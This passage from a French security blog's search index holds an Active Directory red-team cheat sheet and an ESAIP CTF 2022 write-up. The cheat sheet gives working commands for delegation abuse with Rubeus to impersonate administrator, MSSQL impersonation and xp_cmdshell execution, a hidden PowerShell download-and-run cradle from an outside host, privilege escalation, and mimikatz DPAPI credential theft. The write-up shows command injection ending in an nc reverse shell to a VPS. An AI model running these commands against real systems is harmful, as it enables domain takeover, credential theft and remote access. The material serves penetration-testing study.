powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> raphguisvr <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;raphgui123!&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>)<br></code></pre></td></tr></table></figure><p>2-  Récupérer le SID (Sécurity Identifier) :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$svrsid</span> = <span class="hljs-built_in">Get-DomainComputer</span> raphguisvr | <span class="hljs-built_in">select</span> <span class="hljs-literal">-expand</span> objectsidspose.Words.b8a8f815<span class="hljs-literal">-686d-4082-ae71-ce7001721a24</span>.<span class="hljs-number">086</span>.png)<br></code></pre></td></tr></table></figure><p>3-  Attaque :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$SD</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<span class="hljs-variable">$</span>(<span class="hljs-variable">$svrsid</span>))&quot;</span><br><br><span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength) <br><br><span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, <span class="hljs-number">0</span>) <br><br><span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;COMPUTER&quot;</span> | <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msDS-AllowedToActOnBehalfOfOtherIdentity&#x27;</span> = <span class="hljs-variable">$SDBytes</span>&#125; <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><p>Désormais nous pouvons impersonate le user choisis :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\Rubeus.exe <span class="hljs-built_in">hash</span> /password:raphgui123! /user:raphguisvr /domain:<span class="hljs-string">&#x27;DOMAIN&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>Récupérer le Hash RC4 : { rc4_hmac : xxxxxxxxxxxxx }</li></ul><p>Maintenant on peut demander le ticket kerberos de raphguisvr, on va pouvoir impersonate administrator.  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\Rubeus.exe s4u /user:raphguisvr$ /rc4:<span class="hljs-string">&#x27;hash&#x27;</span> /impersonateuser:administrator /msdspn:cifs/<span class="hljs-string">&#x27;domain computer&#x27;</span> /ptt<br></code></pre></td></tr></table></figure><h3 id="Service-for-User"><a href="#Service-for-User" class="headerlink" title="Service for User"></a>Service for User</h3><p>Service for user ou plus communément appelé s4u, est une extension du protocole kerberos.</p><p>Cette extension est utilisé lors de la delegation constrained. Nous avons deux extensions principales.</p><p>Service for user to Proxy (S4u2Proxy):</p><p>Il s’agit d’une extension qui va permettre d’obtenir un ticket de service (TS) pour un autre service au nom d’un utilisateur. Service for user to Self (S4u2self):</p><p><code> </code>Il s’agit d’une extension qui va permettre d’obtenir un ticket de service au nom d’un utilisateur.</p><p>Désormais en exploitation, nous allons depuis une machine qui a de la délégation constrained request via s4u2self un TS d’un user (Par default : Administrator). Puis avec ce ticket de service nous allons demander au nom de l’utilisateur impersonnate (administrator) demander un ticket de service sur un autre service (Exemple : cifs\dc.domain).</p><h2 id="MS-SQL"><a href="#MS-SQL" class="headerlink" title="MS SQL"></a>MS SQL</h2><p>Pour exploiter les bases de données mssql, nous allons tout d’abord commencer par une phase d’énumération. Pour cela on va prendre PowerUPSQL.</p><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumération"></a>Enumération</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">powershell</span>-<span class="hljs-keyword">import</span> C:\Tools\PowerUpSQL\PowerUpSQL.ps1<br></code></pre></td></tr></table></figure><p>En suite avec SQLInstanceDomain on va pouvoir chercher tous les SPNs qui commences avec MSSQL :</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">powerpick</span> <span class="hljs-meta">Get</span>-SQLInstanceDomain<br></code></pre></td></tr></table></figure><p>Tester une connection :</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">powerpick</span> <span class="hljs-meta">Get</span>-SQLConnectionTest<br></code></pre></td></tr></table></figure><p>Pour obtenir des informations sur la machine (Version, Domain, Service Account etc..):</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">powerpick</span> <span class="hljs-meta">Get</span>-SQLServerInfo -Instance <span class="hljs-string">&quot;SPN.DOMAIN,1433&quot;</span><br></code></pre></td></tr></table></figure><p>On peut aussi utiliser PowerView :</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">powershell-<span class="hljs-keyword">import</span> <span class="hljs-name">C</span>:\Tools\PowerSploit\Recon\PowerView.ps1![ref5]<br></code></pre></td></tr></table></figure><p>Cela nous permettra d’obtenir les Machines ainsi que les utilisateurs dans le groupe :</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-DomainGroup -<span class="hljs-keyword">Identity</span> \*<span class="hljs-keyword">SQL</span>\* | % &#123; <span class="hljs-keyword">Get</span>-DomainGroupMember -<span class="hljs-keyword">Identity</span> $_.distinguishedname | <span class="hljs-keyword">select</span> groupname, membername &#125;<br></code></pre></td></tr></table></figure><h3 id="Usurpation-d’un-utilisateur"><a href="#Usurpation-d’un-utilisateur" class="headerlink" title="Usurpation d’un utilisateur"></a>Usurpation d’un utilisateur</h3><p>Pour commencer, nous allons faire une requête pour voir si il y’a des utilisateurs qui sont usurpables :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> sys.server_permissions <span class="hljs-keyword">WHERE</span> permission_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;IMPERSONATE&#x27;</span>;<br></code></pre></td></tr></table></figure><p>Grâce à la requête, on peut voir quel utilisateur est usurpable et depuis quel user exemple :</p><blockquote><p>user 25 peut usurper l’user 26</p></blockquote><p>Désormais grâce à cette commande :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, principal_id, type_desc, is_disabled <span class="hljs-keyword">FROM</span> sys.server_principals;<br></code></pre></td></tr></table></figure><p>Nous allons pouvoir récupérer les id, username, une description et si il est actif. On peut aussi faire :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe -a windows -s SPN.DOMAIN,1433 -m impersonate &lt;user&gt;<br></code></pre></td></tr></table></figure><p>La fonction   IS_SRVROLEMEMBER permet de savoir si l’utilisateur actuel peut réaliser une action nécessitant les autorisations du rôle serveur.</p><p>Si on fait :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br></code></pre></td></tr></table></figure><p>Le retour sera NULL car nous n’avons pas les droits. Pour usurper un utilisateur :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">AS</span> login <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;DEV\mssql_svc&#x27;</span>;<br></code></pre></td></tr></table></figure><p>Nous allons éxécuter une action en tant que l’utilisateur choisie. Donc si on fait :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">AS</span> login <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;DEV\mssql_svc&#x27;</span>; <span class="hljs-keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br></code></pre></td></tr></table></figure><p>Nous aurons comme retour 1.</p><p>Désormais avec ADSearch nous pouvons le faire :</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">execute-assembly <span class="hljs-name">C</span>:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe -a windows -s SPN.DOMAIN,<span class="hljs-number">1433</span> -m whoami -i DEV\mssql_svc<br></code></pre></td></tr></table></figure><h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><p>Désormais que nous avons les privilèges admins sur la mssql, nous pouvons activer XP_CMDSHELL. Cela va nous permettre de passer des commandes dans un command prompt :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">sp_configure <span class="hljs-string">&#x27;Show Advanced Options&#x27;</span>, <span class="hljs-number">1</span>; RECONFIGURE;<br>sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>; RECONFIGURE;<br></code></pre></td></tr></table></figure><p>Il ne nous reste plus qu’a récupéré notre beacon, pour ça reverse port warding :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;8080-In&quot;</span> <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>Sur CS : </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rportfwd 8080 127.0.0.1 80![ref7]<br></code></pre></td></tr></table></figure><p>Plus qu’a RCE :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">xp_cmdshell &quot;powershell -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.10.123.102&#x27;&#x27;))&quot;<br></code></pre></td></tr></table></figure><h3 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h3><p>Nous pouvons regarder une fois que nous avons pwn le server si il est trust avec un server :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> srvname, srvproduct, rpcout <span class="hljs-keyword">FROM</span> master..sysservers;<br></code></pre></td></tr></table></figure><p>Ensuite on va faire :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> OPENQUERY(&quot;SPN.DOMAIN&quot;, <span class="hljs-string">&#x27;select @@servername&#x27;</span>);<br></code></pre></td></tr></table></figure><p>Nous allons voir si XP_CMDSHELL est activé :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> OPENQUERY(&quot;SPN.DOMAIN&quot;&quot;, &#x27;SELECT \* FROM sys.configurations WHERE name = &#x27;&#x27;xp_cmdshell&#x27;&#x27;&#x27;);<br></code></pre></td></tr></table></figure><p>Si nous ne recevons rien c’est qu’il est désactivé, donc nous n’avons plus qu’a l’activer :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span>(<span class="hljs-string">&#x27;sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;, 1; reconfigure;&#x27;</span>) <span class="hljs-keyword">AT</span> [<span class="hljs-keyword">sql</span><span class="hljs-number">-1.</span>cyberbotic.io]<br><span class="hljs-keyword">EXEC</span>(<span class="hljs-string">&#x27;sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;, 1; reconfigure;&#x27;</span>) <span class="hljs-keyword">AT</span> [<span class="hljs-keyword">sql</span><span class="hljs-number">-1.</span>cyberbotic.io]<br></code></pre></td></tr></table></figure><p>Plus qu’a re reverse port forward, puis RCE :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> OPENQUERY(&quot;sql-1.cyberbotic.io&quot;, <span class="hljs-string">&#x27;select @@servername; exec xp_cmdshell &#x27;&#x27;powershell -w hidden -enc &lt;ps_base64&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Privesc-1"><a href="#Privesc-1" class="headerlink" title="Privesc"></a>Privesc</h2><p>On peut voir si  impersonate un user :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges<br></code></pre></td></tr></table></figure><p>Plus qu’a privesc avec sweatpotatoes :</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">execute</span>-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;xxx&gt;</span><br></code></pre></td></tr></table></figure><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><p>DPAPI est le diminutif de data protection API.  Il s’agit d’un credential Manager pour windows  Active Directory. Pour énumérer les utilisateurs :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run vaultcmd /listspose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.112.png)<br></code></pre></td></tr></table></figure><p>Puis si il y’a  Windows Credentials , nous allons faire :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run vaultcmd /listcreds:&quot;Windows Credentials&quot; /all<br></code></pre></td></tr></table></figure><p>Ou avec Seatbelt :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault<br></code></pre></td></tr></table></figure><p>Puis :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles![ref6]<br></code></pre></td></tr></table></figure><p>Il faut obtenir la masterkeys :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-2708793558-3453453652-160833008-1106\cd3e8be<br></code></pre></td></tr></table></figure><p>Ensuite avec mimikatz :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz dpapi::cred /in:C:\Users\&lt;users&gt;\AppData\Local\Microsoft\Credentials\&lt;filename&gt; /masterkey:&#x27;keys&#x27;<br></code></pre></td></tr></table></figure><h2 id="Trust-Domain"><a href="#Trust-Domain" class="headerlink" title="Trust Domain"></a>Trust Domain</h2><h3 id="Parent-Child"><a href="#Parent-Child" class="headerlink" title="Parent&#x2F;Child"></a>Parent&#x2F;Child</h3><p>Il s’agit d’un relation entre deux domaines. Nous pouvons le voir avec l’attribut WITHIN_FOREST , grâce à powerview. Nous allons prendre l’exemple de CRTO :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">powerpick Get-DomainTrust | <span class="hljs-keyword">select</span> TrustAttributes</span> <br><br>TrustAttributes<br>~~~~~~~~~~~~~~~ <br>WITHIN_FOREST<br></code></pre></td></tr></table></figure><h3 id="Bidirectionnel"><a href="#Bidirectionnel" class="headerlink" title="Bidirectionnel"></a>Bidirectionnel</h3><p>Lorsque la  TrustDirection est en bidirectionnel, soit “two-way”. C’est à dire que les deux domaines ont accès l’un à l’autre. Si nous sommes Administrateur sur le domain child alors nous auront accès en tant qu’administrateur sur le domain parent.</p>]]></content>
    
    
    <categories>
      
      <category>pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cheatsheet</tag>
      
      <tag>ad</tag>
      
      <tag>active-directory</tag>
      
      <tag>delegation</tag>
      
      <tag>Persistance</tag>
      
      <tag>Trust Domain</tag>
      
      <tag>evasion</tag>
      
      <tag>kerberos</tag>
      
      <tag>credential</tag>
      
      <tag>mssql</tag>
      
      <tag>cobalstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ESAIP CTF 2022] - Terminal Weather (479)</title>
    <link href="/2022/06/04/terminal-weather/"/>
    <url>/2022/06/04/terminal-weather/</url>
    
    <content type="html"><![CDATA[<h1 id="Terminal-Weather"><a href="#Terminal-Weather" class="headerlink" title="Terminal Weather"></a>Terminal Weather</h1><p>Nous allons aujourd’hui voir le dernier challenge en pwn de l’ESAIP CTF.<br>Nous n’avions pas de binaire simplement un remote.</p><p>Lorsque nous nous connections nous avions cela :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[raphgui@ret2arch:Téléchargements/pwn][1]$ nc terminal-weather.esaip-cyber.com 55555               (06-05 17:00)<br>Welcome to the Terminal Weather Service<br><br>----- MENU -----<br> 1. Change city<br> 2. Get weather<br> 3. Exit<br><br>Choice:<br></code></pre></td></tr></table></figure><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Ce challenge est celui qui m’a prit le plus de temps (2 heures). Pourtant le principe est simple, on va y venir.<br>Nous avons donc un menu avec des options tels que :</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>Change city<br><span class="hljs-bullet">- </span>Get weather<br></code></pre></td></tr></table></figure><p>Nous pouvons donc enlever les éventuelles technique de heap traditionnelles (Uaf &amp; Double Free).</p><p>Nous allons alors tester le changement de ville pour voir ce qu’il se passe : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">----- Change city -----<br>Enter the new city name: MILF<br>New city: MILF<br><br>----- MENU -----<br> 1. Change city<br> 2. Get weather<br> 3. Exit<br><br>Choice:<br></code></pre></td></tr></table></figure><p>Nous allons tester d’avoir le temps de cette ville :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">----- Weather -----<br>MILF: ⛅️ (Partly cloudy) +31°C 🌒 1012hPa<br><br><br>----- MENU -----<br> 1. Change city<br> 2. Get weather<br> 3. Exit<br><br>Choice:<br></code></pre></td></tr></table></figure><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>On comprends donc qu’il faudrait passer comme nom de ville notre payload. Au bout de plusieurs essaie, je teste ça :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">----- Change city -----<br>Enter the new city name: /bin/sh<br>New city: /bin/sh<br><br>----- MENU -----<br> 1. Change city<br> 2. Get weather<br> 3. Exit<br><br>Choice: 2<br><br>----- Weather -----<br>&lt;a href=<span class="hljs-string">&quot;/bin/sh?format=%l:+%c(%C)+%t+%m+%P\n&quot;</span>&gt;Moved Permanently&lt;/a&gt;.<br></code></pre></td></tr></table></figure><p>Nous avons réussi à avoir une erreur. C’est à ce moment là que j’ai perdu énormement de temps.<br>Je pensais pouvoir refermer la balise et ensuite injecter une commande.<br>Et j’ai passé plus d’une heure sur ça.</p><p>Ensuite j’arrive à avoir une erreur qui me donne un compte Twitter :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Follow @igor_chubin <span class="hljs-keyword">for</span> wttr.in updates<br></code></pre></td></tr></table></figure><p>En checkant son twitter, il s’agit du créateur de l’API pour le temps. Pour intéragir avec son API, nous devons faire un :</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">curl wttr.in/<span class="hljs-tag">&lt;<span class="hljs-name">la</span> <span class="hljs-attr">ville</span>&gt;</span><br></code></pre></td></tr></table></figure><p>On comprend donc à ce moment là que c’est le cas avec notre programme.</p><h2 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h2><p>J’ai essayé les commandes injections telles que  :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>; | <span class="hljs-built_in">ls</span><span class="hljs-comment"># ...</span><br></code></pre></td></tr></table></figure><p>Certain caractère étaient filtrés.</p><p>Puis j’ai trouvé cela :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">----- Change city -----<br>Enter the new city name: $(<span class="hljs-built_in">id</span>)<br>New city: $(<span class="hljs-built_in">id</span>)<br><br>----- MENU -----<br> 1. Change city<br> 2. Get weather<br> 3. Exit<br><br>Choice: 2<br><br>----- Weather -----<br>&gt;&gt;&gt;    _  _    ___  _  _        <br>&gt;&gt;&gt;   | || |  / _ \| || |         <br>&gt;&gt;&gt;   | || |_| | | | || |_         <br>&gt;&gt;&gt;   |__   _| |_| |__   _|         <br>&gt;&gt;&gt;      |_|  \___/   |_|       <br>&gt;&gt;&gt;                          <br>&gt;&gt;&gt;   404 UNKNOWN LOCATION: uid=1000(challenge)   <br>&gt;&gt;&gt;                    <br>----<br></code></pre></td></tr></table></figure><p>Nous avons donc réussi à injecter une comande qui a été exécuté par le serveur.<br>J’ai donc fais un <code>ls</code> pour voir ce qu’on avait :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">entrypoint.sh<br></code></pre></td></tr></table></figure><p>Lancer des commandes par le nom de la ville, est assez long. Il nous faut un shell.</p><h2 id="GET-A-SHELL"><a href="#GET-A-SHELL" class="headerlink" title="GET A SHELL"></a>GET A SHELL</h2><p>Pour cette dernière partie, nous allons donc tenter d’obtenir un reverse shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">----- Change city -----<br>Enter the new city name: $(nc 141.95.159.112 1337 -e /bin/sh)<br>New city: $(nc 141.X.X.X 1337 -e /bin/sh)<br></code></pre></td></tr></table></figure><p>Nous avons alors une connection sur le VPS :</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">rxph@vps-d9a65da8:~$ nc -lnvp 1337<br>Listening on 0.0.0.0 1337<br>Connection received on 20.74.23.147<span class="hljs-number"> 2048 </span><br>id<br>uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)<br>ls -lah<br>total 20K    <br>drwxr-x---   <span class="hljs-number"> 1 </span>root     challeng    4.0K Jun <span class="hljs-number"> 3 </span>17:18 .<br>drwxr-xr-x   <span class="hljs-number"> 1 </span>root     root        4.0K Jun <span class="hljs-number"> 5 </span>10:48 ..<br>-rwxr-x---   <span class="hljs-number"> 1 </span>root     challeng     <span class="hljs-number"> 31 </span>Jun <span class="hljs-number"> 3 </span>17:15 .flag.txt<br>-rw-r-x---   <span class="hljs-number"> 1 </span>root     challeng    <span class="hljs-number"> 117 </span>Jun <span class="hljs-number"> 3 </span>17:18 entrypoint.sh<br>-rwxr-x---   <span class="hljs-number"> 1 </span>root     challeng    1.2K Jun <span class="hljs-number"> 3 </span>17:15 weather.py<br>cat .flag.txt<br>ECTF&#123;N0_W347h3r_f0r_b4d_b0yyy5&#125;<br></code></pre></td></tr></table></figure><p>Ce challenge était super cool, j’ai pu passé une bonne partie de ce challenge à chercher avec <a href="https://milfctf.com/about/#hashp4">hashp4</a>.</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse-shell</tag>
      
      <tag>command-injection</tag>
      
      <tag>ESAIPCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
